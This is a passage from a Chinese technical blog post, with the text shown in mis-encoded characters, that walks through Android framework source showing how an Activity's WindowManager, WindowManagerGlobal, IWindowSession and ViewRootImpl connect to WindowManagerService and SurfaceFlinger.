<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">ID_ANDROID_CONTENT</span> <span class="hljs-operator">=</span> com.android.internal.R.id.content;
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">åº”ç”¨ä¸­çš„WindowManagerå¯¹è±¡</h3>
<p>åº”ç”¨ä¸­çš„æ¯ä¸ª<code>Activity</code>å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªç±»å‹ä¸º<code>WindowManager</code>çš„æˆå‘˜å˜é‡<code>mWindowManager</code>ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Activity</span> {
    ...
    <span class="hljs-keyword">private</span> WindowManager mWindowManager;
    ...
}
</code></pre>
<p><code>mWindowManager</code>ç”¨äºå’Œ<code>WMS</code>é€šä¿¡ï¼Œä¸è¿‡<code>WindowManager</code>æ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">WindowManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ViewManager</span> {...}
</code></pre>
<p><code>mWindowManager</code>ä¹Ÿæ˜¯åœ¨<code>attach()</code>æ–¹æ³•ä¸­è¿›è¡Œçš„åˆå§‹åŒ–ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">(...)</span> {
        ...
        mWindow = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhoneWindow</span>(<span class="hljs-built_in">this</span>, window, activityConfigCallback);
        ...
        mWindow.setWindowManager(
                (WindowManager)context.getSystemService(Context.WINDOW_SERVICE),
                mToken, mComponent.flattenToString(),
                (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != <span class="hljs-number">0</span>);
        ...
        mWindowManager = mWindow.getWindowManager();
        ...
    }
</code></pre>
<p>åœ¨<code>attach()</code>æ–¹æ³•ä¸­ï¼Œå¯¹<code>mWindowManager</code>å˜é‡çš„èµ‹å€¼æ˜¯è°ƒç”¨<code>mWindow</code>çš„<code>getWindowManager()</code>æ–¹æ³•å®Œæˆçš„ã€‚</p>
<p>ä½†æ˜¯åœ¨è¿™ä¹‹å‰ï¼Œ<code>attach()</code>æ–¹æ³•ä¸­è¿˜è°ƒç”¨äº†<code>mWindow</code>å¯¹è±¡çš„<code>setWindowManager()</code>æ–¹æ³•ã€‚å‰é¢æˆ‘ä»¬å·²ç»çŸ¥é“<code>mWindow</code>å¯¹è±¡çš„ç±»å‹æ˜¯<code>PhoneWindow</code>ï¼Œä¸è¿‡è¿™ä¸ª<code>setWindowManager()</code>æ–¹æ³•æ˜¯åœ¨åŸºç±»<code>Window</code>ä¸­å®ç°çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWindowManager</span><span class="hljs-params">(WindowManager wm, IBinder appToken, String appName,
            <span class="hljs-type">boolean</span> hardwareAccelerated)</span> {
        mAppToken = appToken;
        mAppName = appName;
        mHardwareAccelerated = hardwareAccelerated
                || SystemProperties.getBoolean(PROPERTY_HARDWARE_UI, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">if</span> (wm == <span class="hljs-literal">null</span>) {
            wm = (WindowManager)mContext.getSystemService(Context.WINDOW_SERVICE);
        }
        mWindowManager = ((WindowManagerImpl)wm).createLocalWindowManager(<span class="hljs-built_in">this</span>);
    }
    <span class="hljs-keyword">public</span> WindowManager <span class="hljs-title function_">getWindowManager</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> mWindowManager;
    }
</code></pre>
<p>åœ¨<code>setWindowManager()</code>æ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†<code>WindowManagerImpl</code>ç±»çš„<code>createLocalWindowManager()</code>æ–¹æ³•åˆ›å»ºäº†<code>mWindowManager</code>å¯¹è±¡ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> WindowManagerImpl <span class="hljs-title function_">createLocalWindowManager</span><span class="hljs-params">(Window parentWindow)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowManagerImpl</span>(mContext, parentWindow);
    }
</code></pre>
<p><code>createLocalWindowManager()</code>æ–¹æ³•ä¸­æ–°åˆ›å»ºäº†ä¸€ä¸ª<code>WindowManagerImpl</code>å¯¹è±¡ï¼Œå› æ­¤ï¼Œæ¯ä¸ª<code>Activity</code>ä¸­çš„<code>mWindowManager</code>å¯¹è±¡å®é™…ä¸Šæ˜¯ä¸€ä¸ª<code>WindowManagerImpl</code>å¯¹è±¡ï¼Œæˆ‘ä»¬å†çœ‹ä¸‹è¿™ä¸ªç±»çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WindowManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">WindowManagerGlobal</span> <span class="hljs-variable">mGlobal</span> <span class="hljs-operator">=</span> WindowManagerGlobal.getInstance();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Context mContext;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Window mParentWindow;
    ...
}
</code></pre>
<p>åœ¨<code>WindowManagerImpl</code>ä¸­å®šä¹‰äº†ä¸€ä¸ª<code>mGlobal</code>å˜é‡ï¼Œå®ƒçš„å€¼æ˜¯é€šè¿‡<code>WindowManagerGlobal.getInstance()</code>å¾—åˆ°çš„ï¼Œçœ‹æ ·å­æ˜¯ä¸ªå•ä¾‹æ¨¡å¼ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> WindowManagerGlobal <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (WindowManagerGlobal.class) {
            <span class="hljs-keyword">if</span> (sDefaultWindowManager == <span class="hljs-literal">null</span>) {
                sDefaultWindowManager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowManagerGlobal</span>();
            }
            <span class="hljs-keyword">return</span> sDefaultWindowManager;
        }
    }
</code></pre>
<p><code>getInstance()</code>æ–¹æ³•ä¸­åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„<code>WindowManagerGlobal</code>å¯¹è±¡å¹¶ä¿å­˜åˆ°é™æ€å˜é‡<code>sDefaultWindowManager</code>ä¸­</p>
<p>è€Œ<code>WindowManagerImpl</code>ä¸­å„ç§æ–¹æ³•çš„å®ç°åªæ˜¯åœ¨è½¬è°ƒ<code>WindowManagerGlobal</code>ç±»ä¸­çš„æ–¹æ³•ï¼Œç”±æ­¤å¯è§ï¼Œ<strong>ä¸€ä¸ªåº”ç”¨ä¸­æ‰€æœ‰<code>Activity</code>éƒ½æ˜¯é€šè¿‡è¿™ä¸ªè¿›ç¨‹å†…å”¯ä¸€çš„<code>WindowManagerGlobal</code>å¯¹è±¡å’Œ<code>WMS</code>é€šä¿¡</strong></p>
<p><code>WindowManagerGlobal</code>ç±»ä¸­è¿˜æœ‰3ä¸ªé‡è¦çš„æˆå‘˜å˜é‡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowManagerGlobal</span> {
    ...
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayList&lt;View&gt; mViews = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;View&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayList&lt;ViewRootImpl&gt; mRoots = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ViewRootImpl&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayList&lt;WindowManager.LayoutParams&gt; mParams =
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;WindowManager.LayoutParams&gt;();
    ...
}
</code></pre>
<ul>
<li><code>mViews</code>ï¼šä¿å­˜äº†åº”ç”¨ä¸­æ‰€æœ‰é¡¶å±‚<code>View</code>å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>DecorView</code>(ç¨åç»†è®²)</li>
<li><code>mRoots</code>ï¼šä¿å­˜çš„æ˜¯å’Œé¡¶å±‚<code>View</code>å¯¹è±¡å…³è”çš„<code>ViewRootImpl</code>å¯¹è±¡</li>
<li><code>mParams</code>ï¼šä¿å­˜çš„æ˜¯åˆ›å»ºé¡¶å±‚<code>View</code>çš„<code>layout</code>å‚æ•°</li>
</ul>
<h3 data-id="heading-4">å»ºç«‹åº”ç”¨å’ŒWMSçš„è”ç³»</h3>
<p>æˆ‘ä»¬çŸ¥é“åœ¨<code>ActivityThread</code>ä¸­çš„<code>handleResumeActivity()</code>ä¸­ä¼šåˆ›å»º<code>ViewRootImpl</code>å¯¹è±¡å¹¶è¿›è¡Œæ˜¾ç¤ºï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹<code>ViewRootImpl</code>ä¸­å…³é”®çš„å‡ ä¸ªå˜é‡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewRootImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ViewParent</span>,
        View.AttachInfo.Callbacks, ThreadedRenderer.DrawCallbacks {
    ...
    <span class="hljs-keyword">final</span> IWindowSession mWindowSession;
    ...
    <span class="hljs-keyword">final</span> W mWindow;
    ...
}
</code></pre>
<p>å˜é‡çš„åˆå§‹åŒ–æ˜¯åœ¨æ„é€ æ–¹æ³•ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ViewRootImpl</span><span class="hljs-params">(Context context, Display display)</span> {
        mContext = context;
        mWindowSession = WindowManagerGlobal.getWindowSession();
        ...
        mWindow = <span class="hljs-keyword">new</span> <span class="hljs-title class_">W</span>(<span class="hljs-built_in">this</span>);
        ...
    }
</code></pre>
<p>é‡ç‚¹æ˜¯è¿›è¡Œäº†<code>mWindowSession</code>å’Œ<code>mWindow</code>çš„åˆ›å»ºï¼Œæˆ‘ä»¬é€ä¸€çœ‹ä¸‹</p>
<h4 data-id="heading-5">IWindowSessionå¯¹è±¡çš„åˆ›å»º</h4>
<p><code>mWindowSession</code>å˜é‡çš„ç±»å‹æ˜¯<code>IWindowSession</code>ï¼Œå®ƒæ˜¯<code>WMS</code>ä¸­æŸä¸ª<code>Binder</code>å¯¹è±¡çš„å¼•ç”¨å¯¹è±¡ï¼Œ<code>mWindowSession</code>çš„å€¼æ˜¯é€šè¿‡<code>WindowManagerGlobal</code>çš„<code>getWindowSession()</code>æ–¹æ³•è·å¾—çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IWindowSession <span class="hljs-title function_">getWindowSession</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (WindowManagerGlobal.class) {
            <span class="hljs-keyword">if</span> (
            `sWindowSession`== <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">InputMethodManager</span> <span class="hljs-variable">imm</span> <span class="hljs-operator">=</span> InputMethodManager.getInstance();
                    <span class="hljs-type">IWindowManager</span> <span class="hljs-variable">windowManager</span> <span class="hljs-operator">=</span> getWindowManagerService();
                    sWindowSession = windowManager.openSession(
                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">IWindowSessionCallback</span>.Stub() {
                                <span class="hljs-meta">@Override</span>
                                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAnimatorScaleChanged</span><span class="hljs-params">(<span class="hljs-type">float</span> scale)</span> {
                                    ValueAnimator.setDurationScale(scale);
                                }
                            },
                            imm.getClient(), imm.getInputContext());
                } <span class="hljs-keyword">catch</span> (RemoteException e) {
                    <span class="hljs-keyword">throw</span> e.rethrowFromSystemServer();
                }
            }
            <span class="hljs-keyword">return</span> sWindowSession;
        }
    }
</code></pre>
<p>å¦‚æœ<code>sWindowSession</code>ä¸ºç©ºï¼Œå…ˆè·å–<code>InputMethodManager</code>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨<code>WMS</code>çš„<code>openSession()</code>æ¥å£æ¥è¿›è¡Œåˆ›å»ºï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> IWindowSession <span class="hljs-title function_">openSession</span><span class="hljs-params">(IWindowSessionCallback callback, IInputMethodClient client,
            IInputContext inputContext)</span> {
        <span class="hljs-keyword">if</span> (client == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"null client"</span>);
        <span class="hljs-keyword">if</span> (inputContext == <span class="hljs-literal">null</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"null inputContext"</span>);
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Session</span>(<span class="hljs-built_in">this</span>, callback, client, inputContext);
        <span class="hljs-keyword">return</span> session;
    }
</code></pre>
<p><code>openSession()</code>ç›´æ¥åˆ›å»ºäº†ä¸€ä¸ª<code>Session</code>å¯¹è±¡ï¼Œè¿™ä¸ª<code>Session</code>ç±»æˆ‘ä»¬<a href="https://juejin.cn/post/6944960866404007944#heading-5" target="_blank" title="https://juejin.cn/post/6944960866404007944#heading-5">å›¾åƒæ˜¾ç¤ºéƒ¨åˆ†</a>ç®€å•ä»‹ç»è¿‡ï¼Œå®ƒæ˜¯ä¸€ä¸ª<code>Binder</code>æœåŠ¡ç±»ï¼Œç®€è¦å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Session</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindowSession</span>.Stub <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBinder</span>.DeathRecipient {...}
</code></pre>
<p>å¯¹äºç”¨æˆ·è¿›ç¨‹è€Œè¨€ï¼Œè·å–åˆ°çš„ä¾¿æ˜¯è¿™ä¸ª<code>Session</code>å¯¹è±¡çš„<code>Binder</code>å¼•ç”¨å¯¹è±¡ï¼Œå¹¶ä¿å­˜åœ¨äº†<code>WindowManagerGlobal</code>çš„é™æ€å˜é‡<code>sWindowSession</code>ä¸­ã€‚</p>
<p>å› ä¸º<code>WindowManagerGlobal</code>åœ¨è¿›ç¨‹ä¸­å±äºå•ä¾‹çš„å­˜åœ¨ï¼Œå› æ­¤ï¼Œæ‰€æœ‰è°ƒç”¨<code>getWindowSession()</code>æ–¹æ³•è¿”å›çš„éƒ½æ˜¯è¿™ä¸ª<code>sWindowSession</code>å¯¹è±¡</p>
<p>å› æ­¤ï¼Œ<strong>ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ä¸­çš„æ‰€æœ‰<code>ViewRootImpl</code>å¯¹è±¡ä¸­çš„<code>mWindowSession</code>éƒ½å¼•ç”¨çš„æ˜¯ç›¸åŒçš„å¯¹è±¡</strong>ã€‚è€Œè¿™ä¸ª<code>mWindowSession</code>å¯¹è±¡çš„ä½œç”¨ä¾¿æ˜¯å‘<code>WMS</code>å‘èµ·<code>Window</code>ç›¸å…³çš„<code>Binder</code>è°ƒç”¨</p>
<blockquote>
<p>åº”ç”¨è¿›ç¨‹é€šè¿‡<code>sWindowSession</code>å¯¹è±¡å¯ä»¥è°ƒç”¨åˆ°<code>WMS</code>çš„åŠŸèƒ½æ–¹æ³•äº†ï¼Œé‚£ä¹ˆ<code>WMS</code>æ˜¯å¦‚ä½•é€šçŸ¥æˆ–è€…æ§åˆ¶åº”ç”¨è¿›ç¨‹çš„å‘¢ï¼Ÿ</p>
</blockquote>
<h4 data-id="heading-6">W</h4>
<p>åœ¨<a href="https://juejin.cn/post/6944960866404007944#heading-5" target="_blank" title="https://juejin.cn/post/6944960866404007944#heading-5">å›¾åƒæ˜¾ç¤ºéƒ¨åˆ†</a>å·²ç»ä»‹ç»è¿‡<code>ActivityThread</code>çš„<code>handleResumeActivity()</code>æ–¹æ³•äº†ï¼Œæœ€åä¼šè°ƒç”¨åˆ°<code>WindowManagerGlobal</code>å¯¹è±¡çš„<code>addView()</code>æ–¹æ³•ï¼Œæ–¹æ³•å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addView</span><span class="hljs-params">(View view, ViewGroup.LayoutParams params,
            Display display, Window parentWindow)</span> {
        ...
        ViewRootImpl root;
        <span class="hljs-type">View</span> <span class="hljs-variable">panelParentView</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">synchronized</span> (mLock) {
            ...
            root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewRootImpl</span>(view.getContext(), display);
            view.setLayoutParams(wparams);

            mViews.add(view);
            mRoots.add(root);
            mParams.add(wparams);

            <span class="hljs-keyword">try</span> {
                root.setView(view, wparams, panelParentView);
            }
            ...
        }
    }
</code></pre>
<p><code>addView()</code>æ–¹æ³•ä¸­æœ€é‡è¦çš„æ˜¯åˆ›å»ºäº†<code>ViewRootImpl</code>å¯¹è±¡ï¼Œå¹¶é€šè¿‡<code>setView()</code>æŠŠå®ƒå’Œé¡¶å±‚çš„<code>View</code>å¯¹è±¡å…³è”åœ¨äº†ä¸€èµ·ã€‚<code>setView()</code>æ–¹æ³•ç®€è¦å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setView</span><span class="hljs-params">(View view, WindowManager.LayoutParams attrs, View panelParentView)</span> {
    <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
        <span class="hljs-keyword">if</span> (mView == <span class="hljs-literal">null</span>) {
            mView = view;
            ...
            requestLayout();
            ...
            <span class="hljs-keyword">try</span> {
                mOrigWindowType = mWindowAttributes.type;
                mAttachInfo.mRecomputeGlobalAttributes = <span class="hljs-literal">true</span>;
                collectViewAttributes();
                res = mWindowSession.addToDisplay(mWindow, ...);
            }
            ...
        }
    }
}
</code></pre>
<p><code>setView()</code>æ–¹æ³•æ¯”è¾ƒé•¿ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯ï¼š</p>
<ul>
<li>æ–¹æ³•ä¸­å¯¹<code>ViewRootImpl</code>å¯¹è±¡å’Œé¡¶å±‚<code>View</code>ä¹‹é—´çš„å…³è”åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœ<code>mView</code>ä¸ä¸ºç©ºï¼Œä¸ä¼šå†æ¬¡èµ‹å€¼</li>
<li>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>Session</code>çš„<code>addToDisplay()</code>æ–¹æ³•ï¼Œæ›´ä¸ºé‡è¦çš„æ˜¯å‚æ•°<code>mWindow</code></li>
</ul>
<p><code>mWindow</code>çš„ç±»å‹æ˜¯<code>W</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª<code>ViewRootImpl</code>çš„é™æ€å†…éƒ¨ç±»ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">W</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IWindow</span>.Stub {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WeakReference&lt;ViewRootImpl&gt; mViewAncestor;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> IWindowSession mWindowSession;
        ...
    }
</code></pre>
<p>å¯ä»¥çœ‹å‡º<code>W</code>æ˜¯ä¸€ä¸ªå®ç°äº†<code>IWindow</code>æ¥å£çš„<code>Binder</code>æœåŠ¡ç±»ï¼Œå¹¶ä¸”åœ¨<code>ViewRootImpl</code>ä¸­é€šè¿‡<code>Session.addToDisplay()</code>æ–¹æ³•å°†<code>W</code>çš„<code>Binder</code>å¼•ç”¨å¯¹è±¡ä¼ é€’ç»™äº†<code>WMS</code></p>
<p>æˆ‘ä»¬çœ‹ä¸‹æºç ä¸­å¯¹<code>IWindow</code>æ¥å£çš„æè¿°ï¼š</p>
<blockquote>
<p>API back to a client window that the Window Manager uses to inform it of interesting things happening.</p>
</blockquote>
<p>å¯ä»¥çœ‹å‡º<code>WMS</code>é€šè¿‡<code>IWindow</code>æ¥å£æ¥é€šçŸ¥åº”ç”¨ï¼Œæ¥ä¸‹æ¥çœ‹ä¸‹<code>WMS</code>ä¸­æ˜¯å¦‚ä½•å¤„ç†è¿™ä¸ªå¯¹è±¡çš„</p>
<p><em><strong>ç§‹åœ°éº»è¢‹ï½ï¼Œè¿˜è®°å¾—æˆ‘ä»¬å‰è¨€ä¸­çš„é—®é¢˜å—ï¼Œå¿«çœ‹<code>setView</code>ä¸­çš„<code>requestLayout</code>æ–¹æ³•</strong></em></p>
<blockquote>
<p>æ˜¯ä¸æ˜¯å‹¾èµ·äº†ä½œä¸ºåº”ç”¨å¼€å‘è€…çš„å›å¿†</p>
</blockquote>
<h4 data-id="heading-7">Surface å’Œ Activity çš„è”ç³»</h4>
<p><code>ViewRootImpl.setView()</code> ä¼šè§¦å‘ <code>requestLayout()</code>ï¼Œæœ€ç»ˆæ‰§è¡Œåˆ°æ ¸å¿ƒæ–¹æ³• <code>performTraversals()</code>ï¼ˆè¿™æ˜¯ View ç»˜åˆ¶ä¸‰å¤§æµç¨‹ Measure/Layout/Draw çš„å…¥å£ï¼‰</p>
<p><code>performTraversals()</code> 800 å¤šè¡Œã€‚ã€‚ã€‚ç®€è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç é€»è¾‘ ViewRootImpl.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performTraversals</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ...</span>
    <span class="hljs-comment">// 1. é€šè¿‡ IPC è¯·æ±‚ WindowManagerService (WMS) å¯¹çª—å£è¿›è¡Œå¸ƒå±€</span>
    <span class="hljs-comment">// mSurface æ˜¯ ViewRootImpl çš„æˆå‘˜å˜é‡</span>
    relayoutResult = mWindowSession.relayout(..., mSurface, ...);

    <span class="hljs-comment">// 2. WMS åœ¨åº•å±‚åˆ›å»º SurfaceControlï¼Œå¹¶å°† Native å±‚çš„ Surface ä¿¡æ¯</span>
    <span class="hljs-comment">// å›å†™ï¼ˆCopyï¼‰åˆ° ViewRootImpl çš„ mSurface ä¸­ã€‚</span>
    <span class="hljs-comment">// åé¢ä¼šç»†è®²</span>
    
    <span class="hljs-keyword">if</span> (mSurface.isValid()) {
        <span class="hljs-comment">// Surface æ­¤æ—¶å·²ç»å‡†å¤‡å¥½ï¼Œå¯ä»¥åˆæˆäº†</span>
    }
    <span class="hljs-comment">// ...</span>
    performMeasure(...);
    performLayout(...);
    performDraw(...);
}
</code></pre>
<p>åœ¨ <code>relayout</code> è¿‡ç¨‹ä¸­ï¼Œ<code>WMS</code> ä¼šä¸ <code>SurfaceFlinger</code> é€šä¿¡ï¼Œåˆ†é… <code>Layer</code>ï¼ˆå›¾å±‚ï¼‰ã€‚<code>WMS</code> å°†ç”Ÿæˆçš„ <code>Surface</code> ä¿¡æ¯å¡«å……åˆ° <code>ViewRootImpl</code> ä¼ å…¥çš„ <code>mSurface</code> å‚æ•°ä¸­ã€‚</p>
<blockquote>
<p>è¿™æ ·ï¼Œä¸€ä¸ª Activity å°±å’Œ SurfaceFlinger ä¸­çš„ Surface äº§ç”Ÿäº†å…³è”å•¦ã€‚</p>
</blockquote>
<p><span id="user-content-WMS2APP"/></p>
<h3 data-id="heading-8">WMSä¸­å»ºç«‹å’Œåº”ç”¨çš„å…³ç³»</h3>
<p>å‰é¢æåˆ°<code>ViewRootImpl</code>å¯¹è±¡ä¼šé€šè¿‡<code>addToDisplay()</code>æ–¹æ³•å°†<code>IWindow</code>çš„<code>Binder</code>å¼•ç”¨å¯¹è±¡ä¼ é€’åˆ°<code>WMS</code>ä¸­ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸‹<code>addToDisplay()</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-comment">// æ–¹æ³•å®šä¹‰åœ¨ com.android.server.wm.Session ä¸­</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addToDisplay</span><span class="hljs-params">(IWindow window, ...)</span> {
        <span class="hljs-comment">// mService çš„ç±»å‹ä¾¿æ˜¯ WindowManagerService</span>
        <span class="hljs-keyword">return</span> mService.addWindow(<span class="hljs-built_in">this</span>, window, ...);
    }
</code></pre>
<p>è°ƒç”¨äº†<code>WMS</code>çš„<code>addWindow()</code>æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">addWindow</span><span class="hljs-params">(Session session, IWindow client, ...)</span> {
    ...
    <span class="hljs-keyword">synchronized</span>(mWindowMap) {
        ...
        <span class="hljs-keyword">if</span> (mWindowMap.containsKey(client.asBinder())) {
            Slog.w(TAG_WM, <span class="hljs-string">"Window "</span> + client + <span class="hljs-string">" is already added"</span>);
            <span class="hljs-keyword">return</span> WindowManagerGlobal.ADD_DUPLICATE_ADD;
        }
        ...
        <span class="hljs-keyword">final</span> <span class="hljs-type">WindowState</span> <span class="hljs-variable">win</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowState</span>(<span class="hljs-built_in">this</span>, session, client, token, parentWindow,
                appOp[<span class="hljs-number">0</span>], seq, attrs, viewVisibility, session.mUid,
                session.mCanAddInternalSystemWindow);
        ...
        win.attach();
        mWindowMap.put(client.asBinder(), win);
        win.initAppOpsState();
        ...
    }
    ...
    <span class="hljs-keyword">return</span> res;
}
</code></pre>
<p><code>addWindow()</code>æ–¹æ³•ä»£ç åœ¨200å¤šè¡Œï¼Œæ­¤å¤„æˆ‘ä»¬éœ€è¦å…³æ³¨çš„éƒ¨åˆ†æ˜¯ï¼š</p>
<ul>
<li>åˆ›å»ºäº†<code>WindowState</code>å¯¹è±¡å¹¶æ·»åŠ åˆ°<code>mWindowMap</code>é›†åˆä¸­</li>
<li>è°ƒç”¨<code>WindowState</code>å¯¹è±¡çš„<code>attach()</code>æ–¹æ³•</li>
</ul>
<p><code>WindowState</code>åé¢ä¼šè¯¦ç»†ä»‹ç»ï¼Œæ­¤å¤„çš„å…³é”®å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/** A window in the window manager. */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WindowState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WindowContainer</span>&lt;WindowState&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WindowManagerPolicy</span>.WindowState {
    ...
    <span class="hljs-keyword">final</span> Context mContext;
    <span class="hljs-keyword">final</span> Session mSession;
    <span class="hljs-keyword">final</span> IWindow mClient;
    ...
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">attach</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (localLOGV) Slog.v(TAG, <span class="hljs-string">"Attaching "</span> + <span class="hljs-built_in">this</span> + <span class="hljs-string">" token="</span> + mToken);
        mSession.windowAddedLocked(mAttrs.packageName);
    }
}
</code></pre>
<ul>
<li><code>mClient</code>æ˜¯åº”ç”¨è¿›ç¨‹ä¸­<code>Binder</code>æœåŠ¡å¯¹è±¡<code>W</code>çš„å¼•ç”¨å¯¹è±¡</li>
<li><code>mSession</code>ä¾¿æ˜¯<code>WMS</code>å¯¹å¤–å°è£…çš„å¯¹è±¡ä¹‹ä¸€ã€‚ä»¥å‰é¢çš„<code>addToDisplay()</code>ä¸ºä¾‹ï¼Œå®é™…ä¸Šåªæ˜¯è½¬è°ƒäº†<code>WMS</code>çš„<code>addWindow()</code>æ–¹æ³•</li>
